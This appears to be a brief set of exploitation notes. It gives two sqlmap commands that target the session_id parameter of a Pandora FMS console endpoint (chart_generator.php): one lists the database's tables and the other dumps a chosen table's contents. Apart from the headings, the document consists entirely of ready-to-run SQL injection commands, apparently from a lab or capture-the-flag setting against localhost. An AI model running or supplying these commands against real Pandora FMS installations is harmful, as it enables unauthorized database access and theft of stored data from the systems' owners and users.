# SQLmap

List tables

```
sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -D database_name --tables
```

Dump table contents

```
sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -D database_name -t table_name --dump
```

